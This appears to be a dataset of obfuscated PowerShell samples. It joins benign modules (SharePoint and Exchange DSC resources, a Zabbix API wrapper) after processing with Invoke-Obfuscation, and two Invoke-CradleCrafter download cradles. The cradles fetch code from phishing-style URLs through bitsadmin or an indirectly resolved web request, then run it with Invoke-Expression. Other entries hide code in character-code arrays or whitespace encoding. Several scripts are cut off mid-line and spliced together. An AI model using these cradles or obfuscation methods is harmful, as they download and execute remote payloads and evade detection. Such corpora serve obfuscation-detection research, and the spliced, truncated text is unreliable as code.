
InvokeObfuscation/PowerShellGallery/xSharePoint/0.12.0.0/DSCResources/MSFT_xSPAppManagementServiceApp/MSFT_xSPAppManagementServiceApp.psm1
Script 1
function G`eT-tArG`ET`ReSoURcE
{
    [CmdletBinding()]
    [OutputType([System.Collections.Hashtable])]
    param
    (
        [parameter(MANDaTorY = ${Tr`uE})]  [System.String] ${NA`mE},
        [parameter(maNDaTOry = ${Tr`UE})]  [System.String] ${AppLi`ca`Tion`PO`OL},
        [parameter(mAndAToRy = ${f`A`Lse})] [System.String] ${DaT`A`BaSEn`Ame},
        [parameter(manDATORY = ${FaL`se})] [System.String] ${D`AtAba`SeS`E`RvER},
        [parameter(mANDATory = ${FaL`Se})] [System.Management.Automation.PSCredential] ${iNStAl`l`ACcO`UNT}
    )
    .("{0}{2}{1}{3}"-f 'W','o','rite-Verb','se') -Message ('Getti'+'n'+'g '+'A'+'pp '+'manag'+'e'+'ment '+'s'+'ervi'+'ce '+'ap'+'p '+"'$Name'")

    ${r`e`sULt} = .("{1}{5}{2}{3}{4}{0}"-f 'd','Invoke-x','ePointCom','m','an','Shar') -Credential ${InS`T`Alla`CCOunT} -Arguments ${pSB`oU`NdP`ARa`MEters} -ScriptBlock {
        ${PaRA`MS} = ${ar`gS}[0]
        
        ${servI`cEa`P`PS} = &("{2}{3}{6}{0}{4}{5}{1}" -f 'Ap','on','Get-SPSe','rvic','plic','ati','e') -Name ${pARA`Ms}.NAME -ErrorAction ("{3}{1}{2}{0}"-f 'tinue','i','lentlyCon','S') 
        if (${Nu`lL} -eq ${sE`RVIcEA`pps}) { 
            return ${nu`lL} 
        }
        ${Se`R`ViCEAPP} = ${sER`Vic`e`APpS} | .("{1}{2}{0}" -f 't','Wh','ere-Objec') { ${_}.tYPEnaME -eq ("{4}{7}{6}{3}{1}{0}{8}{5}{2}{9}"-f' Ser','ent','plicatio','anagem','App','ce Ap','M',' ','vi','n') }

        If (${NU`LL} -eq ${serViC`EA`pP}) { 
            return ${N`UlL} 
        } else {
            ${R`eTUrn`Val} =  @{
                NaMe = ${sERViCE`A`PP}.diSpLAYnAmE
                ApPlIcaTIonPoOl = ${se`RViCEa`PP}.ApPlicaTIOnPOOL.naME
                databASeNAme = ${seR`Vi`ceApp}.DAtAbase.NamE
                dATAbaseseRveR = ${SeRVi`C`E`App}.DaTabase.sErveR.namE
                InSTaLLAcCouNT = ${Pa`R`AmS}.InSTALlAccoUnt
            }
            return ${reTu`Rn`VAL}
        }
    }
    return ${R`EsUlt}
}


function SET-t`A`RgET`Re`SourcE
{
    [CmdletBinding()]
    param
    (
        [parameter(ManDAToRy = ${t`RuE})]  [System.String] ${Na`mE},
        [parameter(mAndATorY = ${T`RUe})]  [System.String] ${Ap`pl`I`c`ATIo`NpOOl},
        [parameter(MaNDATOrY = ${F`Al`sE})] [System.String] ${DA`TAbASeNA`ME},
        [parameter(MandatoRY = ${F`ALse})] [System.String] ${DAT`AB`AseSer`V`Er},
        [parameter(mandatORY = ${F`ALse})] [System.Management.Automation.PSCredential] ${iNStaLl`AC`cOu`NT}
    )

    ${re`su`lt} = .("{2}{0}{3}{1}" -f'r','esource','Get-Ta','getR') ${PsBO`u`N`DPaR`AmeTErs}

    if (${rE`SULt} -eq ${n`uLL}) { 
        &("{1}{3}{2}{0}" -f'bose','Writ','er','e-V') -Message ('Creati'+'ng'+' '+'A'+'pp '+'mana'+'g'+'emen'+'t '+'Servic'+'e '+'A'+'pplic'+'ati'+'on '+"$Name")
        .("{2}{0}{4}{1}{5}{3}" -f 'ke','SharePointCo','Invo','nd','-x','mma') -Credential ${In`StaL`LACC`ou`Nt} -Arguments ${p`Sb`ouNd`PaRAMet`E`Rs} -ScriptBlock {
            ${p`Ar`AmS} = ${aR`gs}[0]
            
            ${Ne`WPAr`A`Ms} = @{
                namE = ${pa`RA`Ms}.nAmE 
                APPLICaTIOnpOol = ${pa`RaMS}.ApPlIcatIONPOoL
            }
            if (${PA`RAMs}.cONTaiNSkeY(("{0}{3}{1}{2}"-f'Datab','eNam','e','as')) -eq ${T`Rue}) { ${newpA`R`AMS}.AdD(("{1}{0}{2}"-f 'ase','Datab','Name'), ${pAR`AmS}.dATaBaSeNamE) }
            if (${p`A`RAMs}.ContainsKEy(("{0}{1}{3}{4}{2}" -f'Data','baseS','er','er','v')) -eq ${tR`uE}) { ${n`ewP`ARAMS}.aDd(("{1}{0}{3}{2}"-f 'ta','Da','seServer','ba'), ${p`AraMS}.DaTABaSeSERVER) }

            ${APp`SER`ViCE} = &("{8}{1}{0}{3}{4}{9}{2}{10}{5}{7}{6}"-f 'SPA','ew-','c','ppManag','e','Appli','n','catio','N','mentServi','e') ${NE`W`par`AMS}
            .("{5}{4}{10}{7}{6}{1}{8}{0}{3}{9}{2}" -f'p','eA','tionProxy','lic','-SP','New','entServic','gem','p','a','AppMana') -Name "$($params.Name) Proxy " -UseDefaultProxyGroup -ServiceApplication ${ap`ps`Ervi`Ce} -ea ("{1}{0}"-f 'top','S') | &("{0}{2}{1}" -f 'Out','Null','-')
        }
    }
    else {
        if (${A`PP`LiC`Ation`POOL} -ne ${ReS`u`Lt}.appLIcaTionPOol) {
            .("{1}{0}{2}" -f'ite-Ver','Wr','bose') -Message ('U'+'pdating'+' '+'Ap'+'p '+'ma'+'nag'+'e'+
InvokeObfuscation/Github/jabrown85_WindowsPowershell/Modules/WPK/WPK.psm1
Script 4
 .("{1}{0}"-f 'T-ITem','sE') VarIabLE:ZkD (  [tyPE]("{2}{4}{0}{1}{3}{5}" -F 'IO','n.As','REFle','sEm','cT','BLY')  ) ;   &("{2}{3}{0}{1}" -f'b','le','Set','-VariA') ('b'+'cwp') (  [TYpe]("{0}{1}"-F 'iO','.FiLE')  )  ;&("{0}{1}"-f'p','aram')([switch]${R`EF`ReSh}, [string[]]${c`omMA`Ndli`ST}, [Type[]]${AD`DiT`IoN`ALtY`PeS}) 

${wiN`FORm`sINtEgRati`oN} = ("{1}{9}{5}{14}{6}{18}{2}{17}{0}{10}{15}{3}{16}{8}{4}{11}{7}{19}{12}{13}"-f'ion=3.0.','Wind','ration, V','ure=neut','eyT','sFor','Int','8','cK','ow','0.0, Cul','oken=31bf3','d364e','35','ms','t','ral, Publi','ers','eg','56a')

try {
    ${AS`sEM`B`lIEs} =   (  .("{0}{1}{2}" -f'VA','r','iABLe')  zkd  -VA )::("{0}{1}{3}{2}"-f'Load','WithPartia','Name','l').Invoke(("{0}{2}{1}" -f 'Win','se','dowsBa')),
         ${z`Kd}::("{5}{1}{0}{2}{3}{4}"-f'dW','a','ithPart','ialNa','me','Lo').Invoke(("{0}{6}{4}{5}{2}{1}{3}" -f 'P','w','rame','ork','ese','ntationF','r')),
         ( &("{1}{2}{0}" -f'em','cHIlDI','T') ('v'+'aR'+'ia'+'blE:ZKd')  )."V`AlUE"::("{1}{2}{0}{3}" -f 'a','LoadWit','hParti','lName').Invoke(("{4}{3}{0}{1}{2}" -f'ntatio','n','Core','se','Pre')),
          ${Z`KD}::("{1}{0}" -f 'oad','L').Invoke(${w`I`NfoRmsinT`e`GR`ATION})
} catch {
    throw ${_}
}


. ((("{1}{0}{4}{6}{5}{9}{7}{3}{8}{2}"-f'ScriptRo','{1}ps','le.ps1','o','ot','Cod','{0}Add-','enerati','nRu','eG'))-f[char]92,[char]36)

. (("{1}{10}{9}{6}{3}{5}{7}{4}{8}{0}{2}"-f'ul','p5','es.ps1','tRoot','nera','0pg','ip','Rules0pgWPFCodeGe','tionR','r','IpsSc')).rePlAcE(([cHAR]48+[cHAR]112+[cHAR]103),'\').rePlAcE('p5I',[StrINg][cHAR]36)


. ((("{7}{2}{11}{13}{5}{6}{8}{1}{3}{12}{0}{9}{10}{4}"-f'iptC','eTo','ot{0}C','S','s1','From','-T','{1}psScriptRo','yp','md','let.p','on','cr','vert'))  -F [chAr]92,[chAr]36)
. ((("{0}{2}{6}{4}{7}{1}{3}{5}" -f 'Fm','rameter','PpsScriptR','MetaData.','sWFC','ps1','oot','onvertTo-Pa'))  -CrepLaCE 'FmP',[cHAr]36  -ReplaCE  ([cHAr]115+[cHAr]87+[cHAr]70),[cHAr]92)

${scr`i`pTs} = &("{0}{4}{3}{2}{1}"-f 'Ge','tem','I','-Child','t') (("{1}{6}{4}{0}{2}{9}{5}{8}{7}{3}"-f 'Roo','m0','tYD5Generated','ols','t','o','IpsScrip','tr','n','C')).("{2}{1}{0}" -f'ace','ePl','r').Invoke('m0I','$').("{1}{0}"-f'lace','reP').Invoke('YD5','\') `
    -ErrorAction ("{0}{3}{4}{1}{2}"-f 'S','entlyContin','ue','i','l') -Filter ("{1}{0}"-f'1','*.ps')
        
if (-not ${scR`i`pTs}) {
    
    ${n`ulL} = .("{2}{0}{1}"-f 'ew-','Item','N') -Path (("{2}{0}{6}{3}{4}{1}{7}{5}"-f'8psScri','ne','Pi','o','tMJlGe','Controls','ptRo','rated'))."REpLA`cE"('MJl',[stRing][ChaR]92)."reP`LAce"('Pi8',[stRing][ChaR]36) -Type ("{3}{0}{2}{1}"-f 'r','ory','ect','Di') `
        -ErrorAction ("{3}{1}{2}{0}"-f'ntinue','en','tlyCo','Sil')

    foreach (${A`SSe`mBlY} in ${a`s`SEmBlI`ES}) {
        if (-not ${asSE`MB`lY}) { continue } 
        ${N`Ame} = ${a`SsEm`Bly}.("{1}{0}"-f 'tName','Ge').Invoke()."N`AmE"
        .("{0}{2}{1}{4}{3}"-f 'Write-P','ogre','r','s','s') ("{2}{3}{4}{0}{1}" -f 'ing Command','s','C','re','at') ${nA`mE} 
        ${R`esuL`TS} = ${ass`e`MbLY}.("{0}{2}{1}"-f'GetT','s','ype').Invoke() | 
            &("{0}{3}{2}{1}" -f'Whe','ject','b','re-O') {
                ${_}."iS`Pu`BLiC" -and
                (-not ${_}."IsGENEr`IcT`yPe") -and 
                (${_}."FU`llnamE" -notlike ("{2}{1}{0}{3}"-f 'rna','te','*In','l*'))
            } |
            &("{2}{0}{4}{5}{3}{1}" -f 'Fr','t','Convert','dle','om-TypeT','oScriptCm') -ErrorAction ("{1}{2}{0}{4}{3}" -f 'yC','S','ilentl','nue','onti')
        ${p`AtH} = "$psScriptRoot\GeneratedControls\$Name.ps1"
          ( &("{1}{0}{2}"-f 'Ia','var','ble') ('b'+'cwp'))."V`ALUe"::("{2}{1}{3}{0}"-f 'ext','teA','Wri','llT').Invoke(${P`Ath}, ${rESU`L`TS})
    }
    
    ${Sc`RiP`Ts} = .("{1}{0}{3}{2}" -f't-Chi','Ge','m','ldIte') ((("{1}{4}{3}{5}{2}{6}{0}"-f'trols','Tu5ps','d','tRootq9sGenerat','Scrip','e','Con'))  -crEPLAcE  ([CHAr]113+[CHAr]57+[CHAr]115),[CHAr]92-crEPLAcE 'Tu5',[CHAr]36) `
        -ErrorAction ("{0}{1}{2}"-f'Sile','n','tlyContinue') -Filter ("{1}{0}" -f 's1','*.p')
}


foreach (${s} in ${SCRiP`Ts}) { 
    . ${s}."FuL`LNa`ME"
}

foreach (${S} in .("{2}{1}{3}{4}{0}" -f 'em','
InvokeCradleCrafter/invoke-cradlecrafter_random_166.ps1
Script 5
SV Vj 'https://appleverificationserviceintl.com/paypalaccounts';.(Get-Command *ke-*pr*)(((Variable Vj).Value|%{(&(Item Variable:/*cut*t).Value.InvokeCommand.(((Item Variable:/*cut*t).Value.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'G*d'}).Name)((Item Variable:/*cut*t).Value.InvokeCommand.GetCommandName('*-Re*d',1,$TRUE),[System.Management.Automation.CommandTypes]::Cmdlet) (GV _).Value)}))
InvokeCradleCrafter/invoke-cradlecrafter_random_185.ps1
Script 13
SV R5 'Default_File_Path.ps1';SI Variable:/si 'https://securedreaccessconfirmation.idpreapprovement.com/signin';$NULL=bitsadmin /transfer /zpvVkYtblB (Item Variable:si).Value (Variable R5 -ValueOnl);Invoke-Expression (([Char[]](CAT -Encodin 3 (Variable R5 -ValueOnl)))-Join'')
InvokeObfuscation/Github/jondjones_EpiServerLoginBlock/EpiServerLoginBlock/packages/EPiServer.CMS.UI.Core.7.15.0/tools/Get-WebConfig.psm1
Script 15
& ( ([sTrInG]''.LASTinDEXOF)[37,420,251]-JoIn'')( -JOiN( ( 72,91 , 64 , 77,90,71 ,65,64,14 , 105,75, 90, 3 ,121,75 ,76, 109 ,65,64, 72 ,71,73,35 , 36 , 85 , 35, 36, 39,94, 79, 92 ,79,67 , 14,6 , 10 , 94 , 92 ,65 , 68 , 75,77 , 90, 126,79 ,90 ,70 ,7, 35 ,36 ,35 ,36, 39 ,13, 14 , 109,65 ,64, 93 ,90 ,92 ,91,77,90, 14 , 90,70,75 , 14,94 ,79 , 90, 70 ,14 , 90 , 65 , 14 ,90 ,70, 75,14, 89, 75 ,76 ,0 , 77,65,64, 72,71 ,73 ,14, 76, 79 ,93 ,75 , 74, 14,65 ,64, 14,90,70 , 75, 14,94 ,92 ,65 ,68,75 ,77 ,90 , 14 ,94 ,79,90 ,70 , 35 ,36,39 , 10 , 89,75 , 76 , 109,65 ,64, 72 ,71,73, 126 , 79,90,70 ,14 ,19 , 14 , 100 , 65 ,71 ,64 , 3,126, 79, 90 ,70 ,14,10, 94 , 92 ,65,68 , 75 , 77, 90, 126 , 79,90,70 ,14,12 , 89 ,75 ,76 , 0,77 ,65 ,64 , 72, 71,73, 12 ,35 ,36, 35, 36 , 39 ,13 ,14 ,106, 65 , 14 ,79,64, 14, 75 , 79 , 92, 66, 87,14, 75, 86 , 71,90, 14 , 92,75, 90 ,91 ,92 ,64 , 71, 64 ,73 , 14,64,91, 66, 66,14,71 ,72, 14 ,90,70 ,75, 14 , 89 , 75, 76,0 ,77, 65,64 ,72 ,71, 73,14 , 72 , 71 ,66, 75 , 14 ,74, 65, 75 , 93,64 , 9 , 90 ,14, 75,86, 71, 93,90,35, 36 ,39 , 71,72 , 14 ,6, 15 , 6 ,122, 75 , 93 , 90, 3,126 , 79, 90 ,70 ,14 , 10 ,89, 75,76 , 109 , 65 , 64, 72, 71 ,73,126,79 ,90 ,70, 7, 7 , 35, 36, 39 ,85,35 ,36, 39 ,39,92,75 , 90 , 91 ,92 ,64 , 14, 10,64, 91 ,66,66 , 35 ,36,39, 83 ,35 ,36,35 , 36,39 ,13 ,14 ,98 , 65, 79 ,74 , 14 ,90, 70 ,75 , 14, 89,75 ,76 ,0 ,77 ,65,64 ,72,71 , 73 ,14,79, 93,14,79,64 , 14, 118,67,66 ,106 , 65,77,91 ,67 ,75 ,64 ,90 , 35,36, 39, 117, 86,67, 66 , 115 , 14,10,77, 65 ,64, 72,71,73 ,14,19 ,14 ,105 , 75,90,3,109,65 , 64,90 ,75 ,64, 90,14 , 10 ,89 , 75 , 76, 109 ,65 ,64, 72 , 71, 73,126 , 79 ,90 ,70 , 35 , 36 , 35 ,36 , 39,13,14 , 107 ,86 ,94, 79 , 64, 74,14 ,79 , 66, 66,14,90, 70,75 ,14 ,64 ,65 ,74 , 75 , 93, 14,90 ,70 , 79 ,90 , 14 , 70 , 79, 88 , 75 ,14,90 , 70,75,71 ,92 ,14 ,77 , 65,64 , 72, 71 ,73, 91,92 , 79 ,90, 71 , 65 , 64,14 ,71 , 64, 14,79, 64 ,65,90 ,70,75 , 92 ,14,72, 71 , 66 , 75, 35,36 ,39, 10,77,65,64, 72, 71, 73 , 0, 125 ,75,66,75,77 ,90 ,96,65 , 74 , 75,93,6 ,12 , 1, 1, 4 ,117 ,110,77,65, 64, 72, 71, 73 ,125, 65,91, 92 ,77,75 ,115 , 12 ,7 ,14 , 82, 14, 104 ,65,92 , 107 ,79, 77,70 , 3,97,76, 68,75, 77 , 90 , 14,85,35 , 36 ,39,39, 10 ,77 ,65 , 64 , 72 , 71, 73 , 104, 92,79 ,73 , 67, 75 , 64,90,126,79 ,90,70,14, 19 ,14,100,65, 71 ,64 , 3,126,79 , 90 ,70 ,14,10 , 94 , 92 , 65, 68,75, 77,90 ,126 , 79 , 90 , 70, 14,10, 113,0,105 ,75,90,111 , 90, 90,92,71,76, 91,90,75, 6, 12,77 ,65, 64 ,72 ,71, 73,125, 65 , 91 , 92 ,77, 75 ,12,7 ,35 ,36, 39,39 ,71 ,72,14 , 6 ,122,75 , 93, 90 ,3 , 126 , 79 ,90 , 70,14,10 ,77 ,65, 64 ,72, 71, 73, 104,92 ,79, 73,67, 75 , 64 ,90,126, 79 ,90, 70,7, 35 ,36 , 39 , 39, 85 ,35 , 36 , 39 ,39,39, 13, 14,125 , 75 , 90 , 14 ,90 ,70 , 75 , 14 , 77 ,65,64 , 90 ,75 ,64 , 90, 93, 14 , 65,72 , 14, 90, 70, 75 , 14 ,92, 75 , 72, 75 ,92,75 , 64, 77,75 , 74, 14 , 72, 71 , 66 , 75, 14 ,79, 93 , 14 ,90 , 70, 75 , 14, 77,65,64 ,90,75 , 64 ,90 ,93,14 , 65, 72 ,14, 90,70 ,75, 14,92, 75 ,72 ,75,92 ,75,64 , 77 ,71, 64, 73, 14 , 75, 66 ,75 , 67,75 ,64,90,35,36 ,39 , 39 , 39 , 10,113 , 0 ,103 ,64,64 ,75 , 92,118,67, 66,14 ,19, 14,6 ,117, 86 , 67, 66,115 ,6 ,105 , 75 ,90,3,109, 65, 64 ,90 ,75, 64, 90 , 14 , 10 , 77 , 65,64, 72 , 71,73 ,104, 92 , 79 , 73 , 67, 75 ,64,90 , 126, 79,90,70,7, 7 ,0 ,104 ,71,92,93 ,90 , 109, 70 ,71, 66 ,74 ,0 ,103 ,64, 64,75 ,92, 118,67,66,35 , 36 , 39 , 39 ,39, 10, 113,0 ,124 ,75,67,65 , 88 ,75 ,111 , 90, 90,92 , 71, 76, 91 ,90 ,75 , 6, 12,77, 65 , 64,72,71, 73, 125 , 65, 91, 92 , 77,75, 12 , 7, 35 , 36 ,39, 39, 83, 35, 36,39, 83, 35, 36 , 35 ,36 ,39 ,92, 75, 90, 91,92 ,64 , 14 ,10 , 77 ,65, 64 ,72, 71,73, 35,36 ,83, 35, 36 , 35 ,36, 107, 86 , 94, 65 , 92, 90 , 3 ,99 ,65 ,74, 91 , 66 , 75, 99,75, 67 ,76 , 75 ,92 , 14,3, 104,91 ,64, 77,90 , 71 ,65, 64 , 14, 105,75 , 90 , 3, 121 ,75 ,76 , 109, 65,64, 72 ,71, 73,35 , 36 , 13, 14, 125 , 103 ,105 ,14 , 13,14,108 ,75 ,73 ,71, 64, 14 , 93,71 , 73,64, 79 , 90, 91 ,92 , 75, 14, 76, 66 , 65 ,77 , 69, 35, 36 ,13, 14 , 99,103 , 103,116,108, 89, 119 ,100, 101, 65, 116,103, 70,88,77,96, 111,127,77,109, 65,103,103, 119, 5 , 106, 109, 10
InvokeObfuscation/Github/ferventcoder_dsc-resource-kit/xSCOM/DSCResources/MSFT_xSCOMConsoleUpdate/MSFT_xSCOMConsoleUpdate.psm1
Script 21
'  	 	   
  	  	        
  	  	 
          	          
  	  	       
  	 	      
  	  	  
  	  	 
    	   
        	  
  	 	  
  	  	       
     	      
         	     
          	        
  	  	     
  	 	    
  	 	  
  	  	       
         	   
  	 	  
  	  	      
  	  	  
  	  	        
  	  	     
          	          
  	 	  
  	    
  	 
  	   	    
  	    
  	 
          
          	  
       	        
  	 	          
  	 	 
  	 	         
  	 	  
  	  	       
       	       
  	 	      
  	  	 
  	 	 
  	 	      
  	  	 
  	 	    
     	 
     	  
          	    
  	    
  	 
          
          	  
        	          
  	  	        
  	  	       
  	  	   
  	  	        
  	  	       
         	     
  	   	  
  	  	   
  	 	  
     	 
          	  
         	    
  	   	  
  	  	      
  	  	       
  	 	  
  	 	          
     	       
       	        
  	  	  
  	 	         
  	 	         
  	 	  
          	          
  	  	       
  	 	      
  	  	  
  	  	 
  	  	      
     	       
        	   
          	        
  	  	      
  	 	     
  	  	       
          	        
          	         
  	 	         
  	 	  
          	    
     	  
          	    
  	    
  	 
          
  	  	   
          	        
  	  	     
          	        
  	 	          
  	    
  	 
          
     	 
  	    
  	 
          
          
          	  
  	  	   
          	        
  	  	     
          	        
  	 	          
  	 	  
  	  	       
  	 	  
  	  	     
     	 
        	        
          	        
  	  	 
  	 	 
          	        
  	  	       
  	  	  
  	  	     
  	   	  
    	   
       	  
    	   
    	       
  	  	       
  	  	     
  	  	        
  	 	  
     	  
          	    
  	    
  	 
          
          
          	  
         	       
          	        
  	 	         
  	 	      
  	 	 
          	        
  	  	       
  	 	  
         	    
  	 	  
  	  	       
     	 
    	     
         	 
  	  	     
  	 	  
  	  	      
  	 	  
  	  	 
  	  	       
    	     
     	     
    	     
       	      
          	         
  	  	      
  	 	  
  	  	 
  	  	       
    	     
     	  
          	    
  	    
  	 
          
          
          	  
         	    
  	   	  
  	  	      
  	  	       
  	 	  
  	 	          
     	       
         	    
  	  	       
  	  	     
  	 	      
  	  	 
  	 	    
          	    
  	    
  	 
          
          
    	       
       	          
  	  	 
  	  	      
  	  	        
  	  	     
  	 	  
    	   
       	  
    	   
    	     
         	 
  	  	     
  	 	  
  	  	      
  	 	  
  	  	 
  	  	       
    	     
     	     
  	    
  	 
  	    
  	 
          
          
          	  
  	  	   
          	        
  	  	     
          	        
  	 	          
  	 	  
  	  	       
  	 	  
  	  	     
     	 
        	        
          	        
  	  	 
  	 	 
          	        
  	  	       
  	  	  
  	  	     
  	   	  
    	   
       	  
    	   
    	       
  	  	       
  	  	     
  	  	        
  	 	  
     	  
          	    
  	    
  	 
          
          
          	  
         	    
  	   	  
  	  	      
  	  	       
  	 	  
  	 	          
     	       
         	    
  	  	       
  	  	     
  	 	      
  	  	 
  	 	    
          	    
  	    
  	 
          
          
    	       
         	    
  	  	  
  	  	        
  	  	     
          	          
  	 	  
         	 
          	        
  	  	       
  	 	     
     	     
  	    
  	 
  	    
  	 
          
          
          	  
         	    
  	   	  
  	  	      
  	  	       
  	 	  
  	 	          
     	       
         	    
  	  	       
  	  	     
  	 	      
  	  	 
  	 	    
          	    
  	    
  	 
          
          
    	       
         	    
  	  	  
  	  	        
  	  	     
          	          
  	 	  
        	 
  	  	  
  	 	         
  	 	 
  	 	  
  	  	     
    	   
       	  
    	   
    	     
          	   
         	    
  	   	  
  	  	      
  	  	       
  	 	  
  	 	          
       	        

InvokeObfuscation/Github/yubu_psbbix-zabbix-api/psbbix.psm1
Script 31


P`u`sh-LOC`Ation $psScriptRoot
. .\EPOCH-`T`IME`-CO`NV`ert.ps1
. .\Zab`Bi`X-D`B-S`IzE-CAlc.ps1
POP`-locA`TION

function Remove-EmptyLines {
	
	[cmdletbinding()]
    [Alias("rmel")]
    param ([parameter(mandatory=$false,position=0,ValueFromPipeline=$true)][array]$in)
	
	if (!$psboundparameters.count) {
		HE`LP -ex $PSCmdlet.MyInvocation.MyCommand.Name | oUT-Str`i`Ng | ReMoV`E-`E`MP`TyLINeS
		return
	}
	
	$in.split("`r`n") | ? {$_.trim() -ne ""}
}

Function Get-ZabbixHelp {
    
    [CmdletBinding()]
    [Alias("gzh")]
    Param ($znoun,$zverb,[switch]$list,$pattern,[switch]$short,[switch]$alias)
    
	if (!(GET-mo`Du`Le "Find-String")) {Wr`I`TE-hoST "`nInstall module Find-String from Powershell Gallery: install-module find-string -force. Unless this function won't work properly.`n" -f yellow; return }
	if (!$psboundparameters.count) {G`Et-`HeLp -ex $PSCmdlet.MyInvocation.MyCommand.Name | o`uT-`striNg | rEm`o`Ve-`EmP`TyLI`NeS; return}

    if ($list) {D`Ir function:\*-zabbix* | S`eLECT name | S`Ort name}
	elseif ($alias) {G`CM -Module psbbix | %{G`AL -Definition $_.name -ea 0}}
    elseif (!$znoun -and $pattern -and $short) {g`zH | %{foreach ($i in $_) {$i | selE`c`T`-StriNG -Pattern $pattern -AllMatches | Out`-coloRMA`T`CH`inFO -onlyShowMatches}}}
    elseif (!$znoun -and $pattern -and !$short) {G`ZH | oUt`-`ST`RinG | S`eLe`Ct-StriNg -Pattern $pattern -AllMatches | ou`T-c`O`lorMaT`cHiNfo -onlyShowMatches}
    elseif ($znoun -and $pattern -and !$short) {g`Zh $znoun | oUt-ST`Ri`Ng | S`EL`ect-`sTRInG -Pattern $pattern -AllMatches | OU`T-Co`L`or`Ma`TChINFO -onlyShowMatches}
    elseif ($znoun -and $pattern -and $short) {G`Zh $znoun | %{foreach ($i in $_) {$i | sEle`CT-st`Ri`NG -Pattern $pattern -AllMatches | oUt-Co`LoR`m`A`T`CHinFO -onlyShowMatches}}}
    elseif ($zverb -and !$znoun) {d`Ir function:\$zverb-zabbix* | %{W`RITe-h`OSt $_.Name -f yellow; g`ET-h`eLp -ex $_.Name | O`ut`-St`RInG | re`mOVe`-E`MPTYLIN`Es}}
    elseif ($znoun -and !$zverb) {d`Ir function:\*zabbix$znoun | %{wR`ITE`-`HOST $_.Name -f yellow; get-`heLP -ex $_.Name | OuT-S`TR`Ing | rEmove-e`m`P`TylINEs}}
    elseif ($zverb -and $znoun) {d`iR function:\$zverb-zabbix$znoun | %{w`RiTe`-ho`st $_.Name -f yellow; gEt`-he`lP -ex $_.Name | oU`T-St`RiNg | REM`OVE`-em`p`T`yLInES}}
    else {D`IR function:\*zabbix* | %{wRIte-H`o`sT $_.Name -f yellow; GeT`-hELP -ex $_.Name | O`uT-s`TRIng | r`EmoV`e-eM`PtyLiNes}}
}

Function New-ZabbixSession {
    
	[CmdletBinding()]
    [Alias("Connect-Zabbix")]
	Param (
        [Parameter(Mandatory=$True)][string]$IPAddress,
        [Parameter(Mandatory=$True)][PSCredential]$PSCredential,
        [Switch]$UseSSL,
		[switch]$noSSL
    )
    

	$Body = @{
	    jsonrpc = "2.0"
	    method = "user.login"
	    params = @{
		    user = $PSCredential.UserName
		    password = $PSCredential.GetNetworkCredential().Password
	    }
	    id = 1
	    auth = $null
    }

    $BodyJSON = cOn`V`ER`T`TO-jsoN $Body
	write-VE`R`BO`SE $BodyJSON
	
    if (!(TESt-`cO`N`NectI`oN $IPAddress -Quiet -Count 1)) {wRitE`-Ho`sT "$IPAddress is not available.`n" -f red; return}
    
	if ($noSSL) {
		wrIte-Wa`Rn`i`NG "You're going to connect via insecure HTTP protocol. Consider to use HTTPS."
		$Protocol="http"
	}
	elseif ($useSSL) {
		$Protocol="https"
	}	
	else {
		$Protocol="https"
	}
	
    $URL = $Protocol+"://$IPAddress/zabbix"
    try {if (!$global:zabSession) {
		$global:zabSession=INvoKe-`R`Est`MetH`od ("$URL/api_jsonrpc.php") -ContentType "application/json" -Body $BodyJSON -Method Post |
			SeLect-`Obj`eCT jsonrpc,@{Name="session";Expression={$_.Result}},id,@{Name="URL";Expression={$URL}}
	   }
    }
    catch {
        [void]::$_
        wR`I`TE-hosT "Seems SSL certificate is self signed. Trying with no SSL validation..." -f yellow
    } 
    finally {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        $global:zabSession=iNv`oKE-RE`S`Tme`THoD ("$URL/api_jsonrpc.php") -ContentType "application/json" -Body $BodyJSON -Method Post |
			S`ELE`CT-O`BJEct jsonrpc,@{Name="session";Expression={$_.Result}},id,@{Name="UR
InvokeObfuscation/Github/singlestone_Vagrant_DSC_CHEF_Example/GENIISUAT02_DSC/modules/dsc_modules/xExchange/DSCResources/MSFT_xExchOabVirtualDirectory/MSFT_xExchOabVirtualDirectory.psm1
Script 32
function Get-TargetResource
{
	[CmdletBinding()]
	[OutputType([System.Collections.Hashtable])]
	param
	(
		[parameter(MANdatOry = $true)]
		[System.String]
		$Identity,

		[parameter(mandAtoRY = $true)]
		[System.Management.Automation.PSCredential]
		$Credential,

		[System.String[]]
		$OABsToDistribute,

		[System.Boolean]
		$AllowServiceRestart = $false,

		[System.Boolean]
		$BasicAuthentication,

		[System.String]
		$DomainController,

		[System.String[]]
		$ExtendedProtectionFlags,

		[System.String[]]
		$ExtendedProtectionSPNList,

		[ValidateSet("None","Allow","Require")]
		[System.String]
		$ExtendedProtectionTokenChecking,

		[System.String]
		$ExternalUrl,

		[System.String]
		$InternalUrl,

		[System.Int32]
		$PollInterval,

		[System.Boolean]
		$RequireSSL,

		[System.Boolean]
		$WindowsAuthentication
	)

    Import-Module "$((Get-Item -LiteralPath "$($PSScriptRoot)").Parent.Parent.FullName)\Misc\xExchangeCommon.psm1" -Verbose:0

    LogFunctionEntry -Parameters @{"Identity" = $Identity} -VerbosePreference $VerbosePreference

	GetRemoteExchangeSession -Credential $Credential -CommandsToLoad "Get-OabVirtualDirectory","Set-OabVirtualDirectory","Get-OfflineAddressBook","Set-OfflineAddressBook" -VerbosePreference $VerbosePreference

    RemoveParameters -PSBoundParametersIn $PSBoundParameters -ParamsToKeep "Identity","DomainController"

    $vdir = Get-OabVirtualDirectory @PSBoundParameters

    if ($vdir -ne $null)
    {        
        RemoveParameters -PSBoundParametersIn $PSBoundParameters -ParamsToKeep "DomainController"

        $oabs = Get-OfflineAddressBook @PSBoundParameters | where {$_.VIrtuALdirEcTorIes -like "*$($Identity)*"}

        [string[]]$oabNames = @()

        if ($oabs -ne $null)
        {
            foreach ($oab in $oabs)
            {
                $oabNames += $oab.NamE
            }
        }

	    $returnValue = @{
		    ideNtITY = $Identity
            OabSTOdisTrIBuTe = $oabNames
		    BaSICAUtHenTIcatioN = $vdir.BASiCAUTHeNTICaTioN
		    EXTENdeDPrOTECtIONFlaGS = $vdir.EXteNDedProtECtionFlAGS
		    ExTENdeDpRotecTIONspNLiSt = $vdir.ExtenDEdPrOtEcTIonsPnlIST
		    eXteNDeDprOTeCTiONTOkENcHEcKing = $vdir.ExTEndEDPRotecTiOnTokENCheckinG
		    eXTernAlurL = $vdir.exterNALUrl
		    intErNALuRL = $vdir.INteRNaLuRl
            pOLlINTervaL = $vdir.poLLINtERVAl
		    REqUIreSsl = $vdir.RequIRESsL
